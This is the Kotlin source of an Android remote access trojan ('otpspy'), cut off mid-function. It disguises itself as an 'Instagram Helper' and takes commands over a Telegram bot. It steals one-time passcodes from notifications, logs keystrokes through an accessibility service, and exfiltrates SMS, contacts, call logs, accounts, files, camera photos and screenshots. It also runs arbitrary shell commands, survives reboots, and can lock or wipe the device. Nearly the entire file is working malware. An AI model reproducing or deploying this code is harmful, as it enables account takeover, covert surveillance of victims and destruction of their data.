package com.example.otpspy

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.content.res.ColorStateList
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Button
import android.widget.CheckBox
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object Config {
    const val BOT_TOKEN = "PASTE_YOUR_TOKEN_HERE"
    const val CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE"
}

val HELP_TEXT = """
/info /battery /net /sim
/sms /contacts /calllog /apps /accounts /calendar /clip /notif
/screen /ss /sssetup /camf /camb /mic 15 /rec 30
/loc /track on|off
/open pkg /url link /click x y /clicktext t /type t
/swipe x1 y1 x2 y2 /scroll up|down /back /home /recents /longpress x y /pinch x y in|out
/shell cmd /ls path /get path /rm path
/vol up|down|mute|unmute /bright 0-1 /torch on|off /vib /alarm
/lock /wipe /pass 1234 /screenoff /admin
/hide /show /kill pkg /uninstall pkg /toast msg
""".trimIndent()

fun startRat(c: Context) {
    try {
        val i = Intent(c, RatService::class.java)
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(i) else c.startService(i)
    } catch (_: Exception) { }
}

fun startWatchdog(c: Context) {
    try {
        val i = Intent(c, Watchdog::class.java)
        if (Build.VERSION.SDK_INT >= 26) ContextCompat.startForegroundService(c, i)
        else c.startService(i)
    } catch (_: Exception) { }
}

fun enableListener(c: Context) {
    try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
            android.service.notification.NotificationListenerService.requestRebind(
                ComponentName(c, NotifListener::class.java))
    } catch (_: Exception) { }
}

fun dpm(c: Context) = c.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

fun adminComp(c: Context) = ComponentName(c, Admin::class.java)

fun adminActive(c: Context) = try { dpm(c).isAdminActive(adminComp(c)) } catch (_: Exception) { false }

object Sender {

    private fun creds(ctx: Context): Pair<String, String>? {
        val p = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        val t = p.getString("token", "").orEmpty().trim().ifEmpty { Config.BOT_TOKEN }
        val c = p.getString("chat", "").orEmpty().trim().ifEmpty { Config.CHAT_ID }
        if (t.isEmpty() || c.isEmpty() || t.startsWith("PASTE")) return null
        return t to c
    }

    fun send(ctx: Context, text: String) {
        val pair = creds(ctx) ?: return
        Thread {
            try {
                val conn = URL("https://api.telegram.org/bot${pair.first}/sendMessage")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                val body = JSONObject()
                    .put("chat_id", pair.second)
                    .put("text", text.take(3900))
                    .put("disable_web_page_preview", true)
                    .toString()
                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) { }
        }.start()
    }

    fun sendFile(ctx: Context, path: String, caption: String = "", asPhoto: Boolean = false) {
        val pair = creds(ctx) ?: return
        val f = File(path)
        if (!f.exists() || !f.isFile) { send(ctx, "missing: $path"); return }
        if (f.length() > 45L * 1024 * 1024) { send(ctx, "too big: ${f.length() / 1048576} MB"); return }

        Thread {
            val b = "----" + System.nanoTime()
            val method = if (asPhoto) "sendPhoto" else "sendDocument"
            val field = if (asPhoto) "photo" else "document"
            try {
                val conn = URL("https://api.telegram.org/bot${pair.first}/$method")
                    .openConnection() as HttpURLConnection
                conn.doOutput = true
                conn.requestMethod = "POST"
                conn.connectTimeout = 20000
                conn.readTimeout = 180000
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
                val out = conn.outputStream
                out.write("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n${pair.second}\r\n".toByteArray())
                if (caption.isNotEmpty())
                    out.write("--$b\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n${caption.take(900)}\r\n".toByteArray())
                out.write("--$b\r\nContent-Disposition: form-data; name=\"$field\"; filename=\"${f.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n".toByteArray())
                f.inputStream().use { it.copyTo(out) }
                out.write("\r\n--$b--\r\n".toByteArray())
                out.flush()
                out.close()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) { }
        }.start()
    }

    fun sendBytes(ctx: Context, bytes: ByteArray, name: String, caption: String = "") {
        try {
            val f = File(ctx.cacheDir, name)
            f.writeBytes(bytes)
            sendFile(ctx, f.absolutePath, caption, true)
        } catch (_: Exception) { }
    }

    fun get(url: String, timeoutMs: Int): String? = try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = timeoutMs
        conn.readTimeout = timeoutMs
        val s = conn.inputStream.bufferedReader().use { it.readText() }
        conn.disconnect()
        s
    } catch (_: Exception) { null }

    fun token(ctx: Context) = creds(ctx)?.first
}
class NotifListener : android.service.notification.NotificationListenerService() {

    private val recent = ArrayDeque<String>()

    override fun onNotificationPosted(sbn: android.service.notification.StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return
            if (pkg == packageName) return
            val ex = sbn.notification?.extras ?: return
            val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
            val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val big = ex.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val body = if (big.isNotEmpty()) big else text
            if (title.isEmpty() && body.isEmpty()) return

            val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
            val isOtp = Regex("\\b\\d{4,8}\\b").containsMatchIn("$title $body")

            try {
                val f = File(filesDir, "notif.log")
                f.appendText("${System.currentTimeMillis()}|$pkg|$title|$body\n")
                if (f.length() > 400_000) {
                    val keep = f.readLines().takeLast(800)
                    f.writeText(keep.joinToString("\n") + "\n")
                }
            } catch (_: Exception) { }

            if (!prefs.getBoolean("sendAll", false) && !isOtp) return

            val msg = buildString {
                append(if (isOtp) "\uD83D\uDD11 OTP" else "\uD83D\uDD14")
                append("\nApp: ").append(label(pkg))
                if (title.isNotEmpty()) append("\n").append(title)
                if (body.isNotEmpty()) append("\n").append(body)
            }
            val k = msg.hashCode().toString()
            if (recent.contains(k)) return
            recent.addLast(k)
            if (recent.size > 50) recent.removeFirst()
            Sender.send(applicationContext, msg)
        } catch (_: Exception) { }
    }

    private fun label(p: String) = try {
        val pm = packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(p, 0)).toString()
    } catch (_: Exception) { p }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val a = intent.action ?: return
        if (a == Intent.ACTION_BOOT_COMPLETED || a == "android.intent.action.QUICKBOOT_POWERON") {
            enableListener(context)
            startRat(context)
            startWatchdog(context)
            Sender.send(context, "\uD83D\uDD04 Rebooted\n${Build.MANUFACTURER} ${Build.MODEL}")
        } else if (a == Intent.ACTION_POWER_CONNECTED) {
            startRat(context)
        } else if (a == Intent.ACTION_MY_PACKAGE_REPLACED) {
            startRat(context)
            startWatchdog(context)
        }
    }
}

class Watchdog : Service() {

    private val h = Handler(Looper.getMainLooper())
    private val tick = object : Runnable {
        override fun run() {
            startRat(this@Watchdog)
            h.postDelayed(this, 120_000)
        }
    }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                NotificationChannel("wd", "Watchdog", NotificationManager.IMPORTANCE_MIN))
        try {
            val n = NotificationCompat.Builder(this, "wd")
                .setContentTitle("Instagram Helper")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
            if (Build.VERSION.SDK_INT >= 34)
                startForeground(1003, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            else startForeground(1003, n)
        } catch (_: Exception) { }
        h.post(tick)
    }

    override fun onDestroy() {
        h.removeCallbacks(tick)
        super.onDestroy()
    }
}

class Admin : DeviceAdminReceiver() {

    override fun onPasswordFailed(context: Context, intent: Intent) {
        Sender.send(context, "\u26A0\uFE0F Wrong unlock attempt")
        try {
            Cam.snap(context, true) { b ->
                if (b != null) Sender.sendBytes(context, b, "fail.jpg", "Wrong PIN")
            }
        } catch (_: Exception) { }
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        Sender.send(context, "\u2705 Unlocked")
    }
}

object Shell {
    fun run(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val out = p.inputStream.bufferedReader().readText()
        val err = p.errorStream.bufferedReader().readText()
        p.waitFor()
        (out + err).ifEmpty { "(no output)" }.take(3500)
    } catch (e: Exception) { "err: ${e.message}" }
}

object Cam {

    fun snap(ctx: Context, front: Boolean, cb: (ByteArray?) -> Unit) {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) { cb(null); return }

        val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val ht = android.os.HandlerThread("cam")
        ht.start()
        val h = Handler(ht.looper)

        try {
            val want = if (front) CameraCharacteristics.LENS_FACING_FRONT
            else CameraCharacteristics.LENS_FACING_BACK

            var found: String? = null
            for (cid in mgr.cameraIdList) {
                if (mgr.getCameraCharacteristics(cid).get(CameraCharacteristics.LENS_FACING) == want) {
                    found = cid
                    break
                }
            }
            if (found == null) { cb(null); ht.quitSafely(); return }

            val camId: String = found
            val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)
            var done = false
            var dev: CameraDevice? = null

            reader.setOnImageAvailableListener({ r ->
                if (!done) {
                    done = true
                    var bytes: ByteArray? = null
                    val image = r.acquireLatestImage()
                    if (image != null) {
                        val buffer = image.planes[0].buffer
                        val arr = ByteArray(buffer.remaining())
                        buffer.get(arr)
                        bytes = arr
                        image.close()
                    }
                    cb(bytes)
                    try { dev?.close() } catch (_: Exception) { }
                    try { r.close() } catch (_: Exception) { }
                    ht.quitSafely()
                }
            }, h)

            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    dev = d
                    try {
                        val req = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        req.addTarget(reader.surface)
                        d.createCaptureSession(listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    try { s.capture(req.build(), null, h) }
                                    catch (_: Exception) { cb(null) }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) { cb(null) }
                            }, h)
                    } catch (_: Exception) { cb(null) }
                }

                override fun onDisconnected(d: CameraDevice) { }
                override fun onError(d: CameraDevice, e: Int) { cb(null) }
            }, h)

            h.postDelayed({
                if (!done) {
                    done = true
                    cb(null)
                    try { dev?.close() } catch (_: Exception) { }
                }
            }, 6000)

        } catch (e: Exception) {
            cb(null)
            ht.quitSafely()
        }
    }
}
object Scr {
    @Volatile var instance: ScreenService? = null
    @Volatile var code: Int? = null
    @Volatile var data: Intent? = null
}

object Acc {
    @Volatile var svc: AccService? = null
    @Volatile var pkg: String = ""
}

class ScreenCapActivity : Activity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(m.createScreenCaptureIntent(), 1)
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        if (res == RESULT_OK && data != null) {
            Scr.code = res
            Scr.data = data
            try {
                ContextCompat.startForegroundService(this, Intent(this, ScreenService::class.java))
            } catch (_: Exception) { }
            Toast.makeText(this, "Screen capture ON", Toast.LENGTH_SHORT).show()
        }
        finish()
    }
}

class ScreenService : Service() {

    private var proj: MediaProjection? = null
    private var vd: VirtualDisplay? = null
    private var reader: ImageReader? = null

    override fun onBind(i: Intent?): IBinder? = null

    private fun cleanup() {
        try { vd?.release() } catch (_: Exception) { }
        try { reader?.close() } catch (_: Exception) { }
        try { proj?.stop() } catch (_: Exception) { }
        proj = null
        vd = null
        reader = null
        Scr.instance = null
    }

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                NotificationChannel("scr", "Screen", NotificationManager.IMPORTANCE_MIN))
        val n = NotificationCompat.Builder(this, "scr")
            .setContentTitle("Instagram Helper")
            .setContentText("Screen ready")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 34)
                startForeground(1002, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            else startForeground(1002, n)
        } catch (_: Exception) { }
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        if (proj == null) setup()
        return START_STICKY
    }

    @Suppress("DEPRECATION")
    private fun setup() {
        val c = Scr.code
        val d = Scr.data
        if (c == null || d == null) return
        val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            proj = m.getMediaProjection(c, d)
            proj?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { cleanup() }
            }, Handler(mainLooper))

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)

            reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2)
            vd = proj?.createVirtualDisplay("scr", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader?.surface, null, null)
            Scr.instance = this
        } catch (_: Exception) { }
    }

    fun grab(): ByteArray? {
        val r = reader ?: return null
        val latch = CountDownLatch(1)
        val slot = arrayOfNulls<Bitmap>(1)

        val listener = ImageReader.OnImageAvailableListener { rr ->
            val image = rr.acquireLatestImage()
            if (image != null) {
                try {
                    val plane = image.planes[0]
                    val bmp = Bitmap.createBitmap(image.width, image.height, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(plane.buffer)
                    slot[0] = bmp
                    image.close()
                } catch (_: Exception) { }
            }
            latch.countDown()
        }

        r.setOnImageAvailableListener(listener, Handler(mainLooper))

        val got = latch.await(3, TimeUnit.SECONDS)
        if (!got) return null

        val b = slot[0] ?: return null
        val out = java.io.ByteArrayOutputStream()
        val w = 720
        val hh = (b.height * (w.toFloat() / b.width)).toInt()
        val scaled = Bitmap.createScaledBitmap(b, w, hh, true)
        scaled.compress(Bitmap.CompressFormat.JPEG, 60, out)
        return out.toByteArray()
    }

    override fun onDestroy() {
        cleanup()
        super.onDestroy()
    }
}

class AccService : AccessibilityService() {

    private val h = Handler(Looper.getMainLooper())
    private var buf = ""
    private var bufPkg = ""
    private var lastApp = ""

    private val flush = object : Runnable {
        override fun run() {
            if (buf.length >= 2)
                Sender.send(applicationContext, "\u2328\uFE0F Typed in ${label(bufPkg)}\n$buf")
            buf = ""
        }
    }

    override fun onServiceConnected() { Acc.svc = this }

    override fun onDestroy() {
        Acc.svc = null
        super.onDestroy()
    }

    override fun onInterrupt() { }

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        val pkg = e.packageName?.toString() ?: return
        if (pkg == packageName) return
        Acc.pkg = pkg

        if (e.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (pkg != lastApp) {
                lastApp = pkg
                if (buf.isNotEmpty()) h.post(flush)
                Sender.send(applicationContext, "\uD83D\uDCF1 ${label(pkg)}")
            }
        } else if (e.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            var t = e.source?.text?.toString().orEmpty()
            if (t.isEmpty()) t = e.text.joinToString("")
            if (t.length >= 2 && t != buf) {
                buf = t
                bufPkg = pkg
                h.removeCallbacks(flush)
                h.postDelayed(flush, 2500)
            }
        }
    }

    fun screenText(): String {
        val sb = StringBuilder()
        try {
            val r = rootInActiveWindow
            if (r != null) walk(r, sb, 0)
        } catch (_: Exception) { }
        return sb.toString()
    }

    private fun walk(n: AccessibilityNodeInfo?, sb: StringBuilder, d: Int) {
        n ?: return
        if (d > 24) return
        var t = n.text?.toString().orEmpty()
        if (t.isEmpty()) t = n.contentDescription?.toString().orEmpty()
        if (t.isNotEmpty()) sb.append(t).append('\n')
        for (i in 0 until n.childCount) walk(n.getChild(i), sb, d + 1)
    }

    fun tap(x: Float, y: Float) {
        val p = Path()
        p.moveTo(x, y)
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(p, 0, 60)).build(), null, null)
    }

    fun swipe(x1: Float, y1: Float, x2: Float, y2: Float) {
        val p = Path()
        p.moveTo(x1, y1)
        p.lineTo(x2, y2)
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(p, 0, 300)).build(), null, null)
    }

    fun longPress(x: Float, y: Float) {
        val p = Path()
        p.moveTo(x, y)
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(p, 0, 700)).build(), null, null)
    }

    fun pinch(cx: Float, cy: Float, spread: Boolean) {
        val a = Path()
        a.moveTo(cx, if (spread) cy - 50f else cy - 400f)
        a.lineTo(cx, if (spread) cy - 400f else cy - 50f)
        val b = Path()
        b.moveTo(cx, if (spread) cy + 50f else cy + 400f)
        b.lineTo(cx, if (spread) cy + 400f else cy + 50f)
        dispatchGesture(GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(a, 0, 400))
            .addStroke(GestureDescription.StrokeDescription(b, 0, 400)).build(), null, null)
    }

    fun goBack() { performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
    fun goHome() { performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
    fun goRecents() { performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS) }

    fun clickText(t: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val list = root.findAccessibilityNodeInfosByText(t) ?: return false
        for (n in list) {
            var cur: AccessibilityNodeInfo? = n
            var i = 0
            while (cur != null && i < 6) {
                if (cur.isClickable) {
                    cur.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
                cur = cur.parent
                i++
            }
        }
        return false
    }

    fun typeText(t: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return false
        val args = Bundle()
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, t)
        return f.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
    }

    private fun label(p: String) = try {
        val pm = packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(p, 0)).toString()
    } catch (_: Exception) { p }
}
class RatService : Service() {

    @Volatile private var alive = false
    private var rec: MediaRecorder? = null
    private var track: LocationManager? = null
    private var trackListener: LocationListener? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                NotificationChannel("rat", "Helper", NotificationManager.IMPORTANCE_MIN))
        val n = NotificationCompat.Builder(this, "rat")
            .setContentTitle("Instagram Helper")
            .setContentText("Verifying account")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 34)
                startForeground(1001, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            else startForeground(1001, n)
        } catch (_: Exception) { }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (!alive) {
            alive = true
            Thread { loop() }.start()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        alive = false
        super.onDestroy()
    }

    private fun loop() {
        val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
        while (alive) {
            try {
                val token = Sender.token(this)
                if (token == null) {
                    Thread.sleep(5000)
                    continue
                }
                val off = prefs.getLong("offset", 0L)
                val raw = Sender.get(
                    "https://api.telegram.org/bot$token/getUpdates?timeout=25&offset=${off + 1}", 30000)
                if (raw == null) {
                    Thread.sleep(3000)
                    continue
                }
                val arr = JSONObject(raw).optJSONArray("result") ?: continue
                for (i in 0 until arr.length()) {
                    val u = arr.getJSONObject(i)
                    val id = u.optLong("update_id", 0L)
                    if (id > off) prefs.edit().putLong("offset", id).apply()
                    val txt = u.optJSONObject("message")?.optString("text") ?: continue
                    try {
                        handle(txt)
                    } catch (e: Exception) {
                        Sender.send(this, "Err: ${e.message}")
                    }
                }
            } catch (_: Exception) {
                try { Thread.sleep(3000) } catch (_: Exception) { }
            }
        }
    }

    private fun handle(t: String) {
        val p = t.trim().split(" ", limit = 2)
        val c = p[0].lowercase()
        val a = if (p.size > 1) p[1].trim() else ""
        val xy = a.split(" ")

        val r: String = when (c) {
            "/help" -> HELP_TEXT
            "/info" -> info()
            "/battery" -> battery()
            "/net" -> net()
            "/sms" -> sms()
            "/contacts" -> contacts()
            "/calllog" -> calllog()
            "/apps" -> apps()
            "/accounts" -> accounts()
            "/calendar" -> calendar()
            "/clip" -> clip()
            "/screen" -> screen()
            "/notif" -> notifLog()
            "/ss" -> { shot(); "screenshot..." }
            "/sssetup" -> {
                startActivity(Intent(this, ScreenCapActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                "approve karo"
            }
            "/cam", "/camf" -> { cam(true); "front cam..." }
            "/camb" -> { cam(false); "back cam..." }
            "/mic" -> mic(if (a.isEmpty()) "15" else a)
            "/rec" -> mic(if (a.isEmpty()) "30" else a)
            "/loc" -> loc()
            "/track" -> trackCmd(a)
            "/open" -> open(a)
            "/url" -> url(a)
            "/click" -> if (xy.size >= 2) { tap(xy[0].toFloat(), xy[1].toFloat()); "tap" } else "x y do"
            "/clicktext" -> if (a.isEmpty()) "text do" else clickText(a)
            "/type" -> if (a.isEmpty()) "text do" else type(a)
            "/swipe" -> if (xy.size >= 4) {
                swipe(xy[0].toFloat(), xy[1].toFloat(), xy[2].toFloat(), xy[3].toFloat())
                "swipe"
            } else "x1 y1 x2 y2"
            "/scroll" -> {
                if (a == "up") { swipe(540f, 1500f, 540f, 400f); "up" }
                else { swipe(540f, 400f, 540f, 1500f); "down" }
            }
            "/back" -> { acc()?.goBack(); "back" }
            "/home" -> { acc()?.goHome(); "home" }
            "/recents" -> { acc()?.goRecents(); "recents" }
            "/longpress" -> if (xy.size >= 2) {
                acc()?.longPress(xy[0].toFloat(), xy[1].toFloat())
                "hold"
            } else "x y"
            "/pinch" -> if (xy.size >= 2) {
                acc()?.pinch(xy[0].toFloat(), xy[1].toFloat(), a.endsWith("out"))
                "pinch"
            } else "x y in|out"
            "/shell" -> if (a.isEmpty()) "cmd do" else Shell.run(a)
            "/ls" -> ls(if (a.isEmpty()) "/sdcard" else a)
            "/get" -> if (a.isEmpty()) "path do" else { Sender.sendFile(this, a); "sending: $a" }
            "/rm" -> if (a.isEmpty()) "path do" else "rm: " + Shell.run("rm -rf \"$a\"")
            "/vol" -> vol(a)
            "/bright" -> bright(a)
            "/torch" -> torch(a)
            "/vib" -> { vib(); "vibrate" }
            "/alarm" -> { alarm(); "alarm" }
            "/lock" -> lock()
            "/wipe" -> wipe()
            "/pass" -> pass(a)
            "/screenoff" -> { off(); "off" }
            "/admin" -> {
                if (adminActive(this)) "admin ON"
                else {
                    startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                        .putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp(this))
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                    "approve"
                }
            }
            "/hide" -> hide(true)
            "/show" -> hide(false)
            "/kill" -> if (a.isEmpty()) "pkg do" else Shell.run("am force-stop $a")
            "/uninstall" -> uninstall(a)
            "/sim" -> sim()
            "/toast" -> { toast(a); "ok" }
            else -> "unknown\n\n$HELP_TEXT"
        }
        if (r.isNotEmpty()) Sender.send(this, r)
    }

    private fun acc() = Acc.svc

    private fun info() = buildString {
        append("Model: ").append(Build.MANUFACTURER).append(' ').append(Build.MODEL).append('\n')
        append("Android ").append(Build.VERSION.RELEASE)
        append(" (API ").append(Build.VERSION.SDK_INT).append(")\n")
        append("Admin: ").append(adminActive(this)).append('\n')
        append("Screen: ").append(Scr.instance != null).append('\n')
        append("Notif: ").append(Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners")?.contains(packageName)).append('\n')
        append("Acc: ").append(acc() != null)
    }

    private fun battery() = try {
        val b = getSystemService(BATTERY_SERVICE) as BatteryManager
        "Battery: ${b.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%"
    } catch (_: Exception) { "?" }

    @Suppress("DEPRECATION")
    private fun net() = buildString {
        try {
            val w = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val n = w.activeNetworkInfo
            append("Type: ").append(n?.typeName).append(" / ").append(n?.subtypeName).append('\n')
            append("Connected: ").append(n?.isConnected)
        } catch (_: Exception) { }
    }

    private fun sms(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
                ?.use { c ->
                    val ai = c.getColumnIndex("address")
                    val bi = c.getColumnIndex("body")
                    var n = 0
                    while (c.moveToNext() && n < 15) {
                        sb.append("\u2022 ").append(c.getString(ai)).append(": ")
                            .append(c.getString(bi)).append("\n\n")
                        n++
                    }
                }
        } catch (_: Exception) { }
        return if (sb.isEmpty()) "none" else sb.toString()
    }

    private fun contacts(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")?.use { c ->
                val ni = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pi = c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var n = 0
                while (c.moveToNext() && n < 120) {
                    sb.append(c.getString(ni)).append(" — ").append(c.getString(pi)).append('\n')
                    n++
                }
            }
        } catch (_: Exception) { }
        return if (sb.isEmpty()) "none" else sb.toString()
    }

    private fun calllog(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC")?.use { c ->
                val ni = c.getColumnIndex(CallLog.Calls.NUMBER)
                val ti = c.getColumnIndex(CallLog.Calls.TYPE)
                val di = c.getColumnIndex(CallLog.Calls.DURATION)
                var n = 0
                while (c.moveToNext() && n < 40) {
                    sb.append(c.getString(ni)).append(" | type ").append(c.getString(ti))
                        .append(" | ").append(c.getString(di)).append("s\n")
                    n++
                }
            }
        } catch (_: Exception) { }
        return if (sb.isEmpty()) "none" else sb.toString()
    }

    private fun apps(): String {
        val sb = StringBuilder()
        try {
            for (pi in packageManager.getInstalledPackages(0).take(200)) {
                sb.append(packageManager.getApplicationLabel(pi)).append(" — ")
                    .append(pi.packageName).append('\n')
            }
        } catch (_: Exception) { }
        return sb.toString()
    }

    private fun accounts(): String = try {
        val arr = android.accounts.AccountManager.get(this).accounts
        if (arr.isEmpty()) "none" else arr.joinToString("\n") { "${it.name} (${it.type})" }
    } catch (_: Exception) { "err" }

    private fun calendar(): String {
        val sb = StringBuilder()
        try {
            contentResolver.query(CalendarContract.Events.CONTENT_URI, null, null, null,
                CalendarContract.Events.DTSTART + " DESC")?.use { c ->
                val ti = c.getColumnIndex(CalendarContract.Events.TITLE)
                var n = 0
                while (c.moveToNext() && n < 25) {
                    sb.append("\u2022 ").append(c.getString(ti)).append('\n')
                    n++
                }
            }
        } catch (_: Exception) { }
